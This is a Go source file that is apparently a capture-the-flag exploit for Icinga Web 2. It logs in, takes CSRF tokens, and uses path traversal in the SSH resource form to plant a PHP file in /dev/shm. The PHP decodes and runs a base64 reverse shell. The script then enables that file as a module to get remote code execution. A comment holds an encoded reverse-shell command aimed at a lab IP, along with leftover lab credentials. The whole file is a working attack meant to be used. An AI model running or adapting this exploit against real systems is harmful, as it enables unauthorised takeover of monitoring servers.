package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strings"

	"github.com/forgoer/openssl"
	"github.com/go-resty/resty/v2"
	"github.com/kyokomi/emoji/v2"
)

func getCSRF(htmlData string) string {

	pattern := regexp.MustCompile("name=\"CSRFToken\" value=\"([^\"]*)\"")
	locatedToken := pattern.FindString(htmlData)
	// fmt.Println(locatedToken)

	tokenPattern := regexp.MustCompile("\"([^\"]*)\"")
	token := strings.Replace(tokenPattern.FindAllString(locatedToken, -1)[1], "\"", "", -1)

	return token
}

func main() {

	// url := "http://icinga.cerberus.local:8080"
	url := os.Args[1]
	username := os.Args[2]
	password := os.Args[3]
	moduleName := os.Args[4]
	revShellBase64 := os.Args[5]

	emoji.Println(":rocket: Lets Exploit ICINGA 2 RCE!!!")
	client := resty.New() //.SetProxy("http://127.0.0.1:8080")

	loginURL := url + "/icingaweb2/authentication/login"

	resp, _ := client.R().Get(loginURL)

	token := getCSRF(resp.String())

	// fmt.Println(resp.Header())

	//fmt.Println(token)

	//csrfToken := "CSRFToken=" + token
	//fmt.Println(csrfToken)
	//##################### LOGIN #######################################################################
	respLogin, _ := client.R().
		// SetBody(`{"username":"matthew","password":"IcingaWebPassword2023"}`).
		// "matthew"
		// "IcingaWebPassword2023"
		SetFormData(map[string]string{
			"username":   username,
			"password":   password,
			"CSRFToken":  token,
			"formUID":    "form_login",
			"btn_submit": "Login",
		}).
		SetHeaders(map[string]string{
			"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			"Accept":       "*/*",
		}).
		Post(loginURL)

	// locateTokenAfterLogin := pattern.FindString(respLogin.String())
	// // fmt.Println(tokenAfterLogin)
	// tokenAfterLogin := strings.Replace(tokenPattern.FindAllString(locateTokenAfterLogin, -1)[1], "\"", "", -1)
	tokenAfterLogin := getCSRF(respLogin.String())

	//fmt.Println(token)
	// fmt.Println(respLogin.Header())

	if strings.Contains(respLogin.String(), "Welcome to Icinga Web!") {
		fmt.Println("login Success")
	} else {
		fmt.Println("login Failed")
	}
	// fmt.Println(respLogin.String())
	keyFile, _ := os.Create("key.pem")
	//if err != nil {
	//	log.Fatal(err)
	//}
	openssl.RSAGenerateKey(1024, keyFile)

	key, err := ioutil.ReadFile("key.pem")
	if err != nil {
		log.Fatal(err)
	}
	// c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAvMTAwMDEgMD4mMQo=
	keyWithShell := "<?php {system ('echo " + revShellBase64 + " | base64 -d | bash');} ?>\n" + string(key)
	// fmt.Println(keyWithShell)

	// Upload the file
	uploadURL := url + "/icingaweb2/config/createresource"

	//##################### File Upload #######################################################################
	respUpload, err := client.R().
		SetFormData(map[string]string{
			"type":        "ssh",
			"name":        "test",
			"user":        "../../../../../../../../../../../../dev/shm/" + moduleName + "/configuration.php",
			"private_key": string(keyWithShell),
			"formUID":     "form_config_resource",
			"CSRFToken":   tokenAfterLogin,
			"btn_submit":  "Save Changes",
		}).
		SetHeaders(map[string]string{
			"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			"Accept":       "*/*",
		}).
		Post(uploadURL)

	// fmt.Println(respUpload.StatusCode())
	if respUpload.StatusCode() == 200 {
		fmt.Println("File Upload Success")
		// locateTokenAfterUpload := pattern.FindString(respUpload.String())
		// // fmt.Println(tokenAfterLogin)
		// tokenAfterUpload := strings.Replace(tokenPattern.FindAllString(locateTokenAfterUpload, -1)[1], "\"", "", -1)
		tokenAfterUpload := getCSRF(respUpload.String())
		//##################### Create Module #######################################################################
		urlCreateModule := url + "/icingaweb2/config/general"

		_, err := client.R().
			SetFormData(map[string]string{
				//"global_show_stacktraces": [2]string{"0", "1"},
				"global_show_stacktraces": "0",
				//"global_show_application_state_messages": [2]string{"0", "1"},
				"global_show_application_state_messages": "0",
				"global_module_path":                     "/dev/shm",
				"global_config_resource":                 "icingaweb2",
				"logging_log":                            "syslog",
				"logging_level":                          "ERROR",
				"logging_application":                    "icingaweb2",
				"logging_facility":                       "user",
				"themes_default":                         "Icinga",
				"themes_disabled":                        "0",
				"authentication_default_domain":          "",
				"formUID":                                "form_config_general",
				"CSRFToken":                              tokenAfterUpload,
				"btn_submit":                             "Save Changes",
			}).
			Post(urlCreateModule)

		//fmt.Println(respCreate.StatusCode())
		if err != nil {
			log.Fatal(err)
		}

		// tokenAfterCreate := getCSRF(respCreate.String())

		//##################### Enable Module #######################################################################
		// urlEnableModule := url + "/icingaweb2/config/moduleenable"
		urlEnableModule := url + "/icingaweb2/config/module?name=" + moduleName

		emoji.Println(":beer: RCE Successful, Enjoy :grinning_cat_with_smiling_eyes:")

		_, err = client.R().
			Get(urlEnableModule)
		// fmt.Println(respEnable.StatusCode())
		//respEnable, err := client.R().
		//	SetFormData(map[string]string{
		//	}

		getFileURL := url + "/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/" + moduleName + "/configuration.php"

		_, err = client.R().
			Get(getFileURL)
		if err != nil {
			log.Fatal(err)
		}
		// fmt.Println(respGetFile.String())
	} else {
		fmt.Println("Upload Failed")
	}
}
